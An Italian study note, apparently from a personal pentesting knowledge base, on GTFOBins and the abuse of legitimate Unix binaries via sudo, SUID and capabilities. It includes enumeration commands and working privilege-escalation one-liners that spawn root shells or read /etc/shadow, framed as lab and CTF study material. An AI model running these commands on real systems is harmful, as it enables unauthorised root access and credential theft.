---
tipo: entita
tag: [linux, tool, metodologia]
fase: 2
fonti: 3
aggiornato: 2026-07-02
stato: maturo
aliases: ["GTFOBins"]
---

# GTFOBins

## In breve

**GTFOBins** (*Get The F*** Out Binaries*) = catalogo online di **binari Unix legittimi** che possono
essere abusati per bypassare restrizioni locali ed effettuare [[Privilege Escalation Linux|privilege escalation]],
evadere shell ristrette o esfiltrare dati. Sito: https://gtfobins.github.io. È il riferimento
"quale binario posso sfruttare?" durante l'enumerazione post-foothold. Equivalente Windows-side: **LOLBAS**.

> [!warning] Etica e legge
> Le tecniche qui descritte servono **solo** su sistemi tuoi o in lab/CTF autorizzati
> ([[TryHackMe]], [[HackTheBox]]). Abusare di un binario per scalare privilegi su un sistema di
> terzi senza autorizzazione scritta è reato. Vedi [[Penetration Testing]].

## Idea di fondo

Molti binari standard espongono funzioni "innocue" (eseguire un comando, leggere/scrivere file,
aprire una shell interna) che diventano **pericolose quando il binario gira con privilegi elevati**.
GTFOBins indicizza il binario e, per ogni **funzione** abusabile, indica la categoria di sfruttamento:

| Categoria | Condizione richiesta | Risultato |
|-----------|----------------------|-----------|
| **Shell** | Binario eseguibile via `sudo` o con bit SUID | Spawn di `/bin/sh` con privilegi del binario |
| **SUID** | Bit [[SUID e SGID|SUID]] impostato (`-rwsr-xr-x`) | Shell che mantiene l'**euid** (spesso root) |
| **Sudo** | Voce in `sudo -l` per quel binario | Comando/shell come l'utente target (root) |
| **Capabilities** | [[Capabilities Linux]] come `cap_setuid+ep` | Privilegio specifico senza SUID completo |
| **File read / write** | Privilegio in lettura/scrittura | Leggere `/etc/shadow`, scrivere `/etc/passwd` |
| **Limited SUID / shell escape** | Shell ristretta (`rbash`, `lshell`) | Evasione verso shell completa |
| **Bind / Reverse shell** | — | Listener o callback di rete |

## Workflow operativo

1. **Enumera** i vettori disponibili:

```bash
sudo -l                              # cosa posso eseguire via sudo (anche NOPASSWD)
find / -perm -4000 -type f 2>/dev/null   # binari con bit SUID
getcap -r / 2>/dev/null              # binari con capabilities
# Oppure automatizzato:
./linpeas.sh                         # vedi [[PEAS]]
```

2. **Cerca il binario** su GTFOBins (es. `find`, `vim`, `tar`, `less`, `awk`, `python`) nella
   categoria che combacia col vettore trovato (sudo / suid / capabilities).
3. **Applica** la tecnica.

### Esempi reali

```bash
# --- SUDO: find eseguibile via sudo -> shell root ---
sudo find . -exec /bin/sh \; -quit

# --- SUDO: vim -> shell root tramite comando interno ---
sudo vim -c ':!/bin/sh'

# --- SUID: il binario find ha il bit SUID -> mantiene euid ---
find . -exec /bin/sh -p \; -quit     # -p preserva i privilegi nella shell

# --- SUID: python con bit SUID -> shell privilegiata ---
./python -c 'import os; os.setuid(0); os.system("/bin/sh")'

# --- CAPABILITIES: python con cap_setuid+ep ---
python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'

# --- FILE READ: less/cat SUID per leggere file protetti ---
sudo less /etc/shadow

# --- SHELL ESCAPE da una shell ristretta tramite awk ---
awk 'BEGIN {system("/bin/sh")}'
```

> [!note] Perché `-p` conta
> Bash e dash, all'avvio, **droppano** l'euid privilegiato se non viene passato `-p`. Per questo
> nello sfruttamento SUID si lancia `/bin/sh -p`: senza, la shell ritorna all'uid reale e l'escalation fallisce.

## Lab

- **TryHackMe**: *Linux PrivEsc*, *Linux Privilege Escalation*, *Common Linux Privesc*,
  *Linux Agency*, percorso *Jr Penetration Tester*.
- **HackTheBox**: box Linux "easy/medium" con vettori sudo/SUID (es. *Lame*, *Shocker*, *Bashed*),
  **HTB Academy** modulo *Linux Privilege Escalation*.
- **pwn.college** — modulo *Program Misuse* (sfruttamento sistematico di binari SUID).

## Domande

1. **D:** Cos'è GTFOBins e a quale domanda operativa risponde durante un pentest?  **R:** È un catalogo di binari Unix legittimi abusabili per bypassare restrizioni, scalare privilegi, evadere shell ristrette o esfiltrare dati. Risponde alla domanda "quale binario posso sfruttare?" nella fase di enumerazione post-foothold. L'equivalente Windows è LOLBAS.
2. **D:** Quali sono i tre vettori principali che vai a incrociare con GTFOBins e con quali comandi li enumeri?  **R:** `sudo -l` (voci sudo, anche NOPASSWD), `find / -perm -4000 -type f 2>/dev/null` (bit SUID) e `getcap -r / 2>/dev/null` (capabilities). Per ognuno cerchi il binario su GTFOBins nella funzione corrispondente.
3. **D:** Perché nello sfruttamento di un binario SUID si lancia `/bin/sh -p` invece di `/bin/sh`?  **R:** Bash e dash, all'avvio, **droppano** l'euid privilegiato se non ricevono `-p`; senza `-p` la shell torna all'uid reale e l'escalation fallisce, mentre `-p` preserva l'euid (spesso root).
4. **D:** Un binario compare in GTFOBins solo sotto la funzione *File read*: cosa puoi e cosa non puoi fare?  **R:** Puoi **leggere** file protetti (es. `/etc/shadow`, da craccare offline), ma non ottieni direttamente una shell o la scrittura: la primitiva disponibile dipende dalla funzione elencata (Shell, SUID, Sudo, File read, File write, Capabilities, Shell escape…).
5. **D:** Perché GTFOBins funziona, cioè qual è l'idea di fondo?  **R:** Molti binari standard espongono funzioni "innocue" (eseguire un comando, leggere/scrivere file, aprire una shell interna) che diventano pericolose quando il binario gira con **privilegi elevati** (via sudo, SUID o capabilities): GTFOBins indicizza binario → funzione abusabile → tecnica.

## Collegamenti

- [[Privilege Escalation Linux]] · [[SUID e SGID]] · [[sudo]] · [[Capabilities Linux]] · [[PEAS]]
- [[Vim e Nano]] · [[HackTricks]] · [[Penetration Testing]] · [[Post-Exploitation]]

## Fonti

- GTFOBins: https://gtfobins.github.io
- LOLBAS (equivalente Windows): https://lolbas-project.github.io
- HackTricks — Linux Privilege Escalation: https://book.hacktricks.xyz/linux-hardening/privilege-escalation
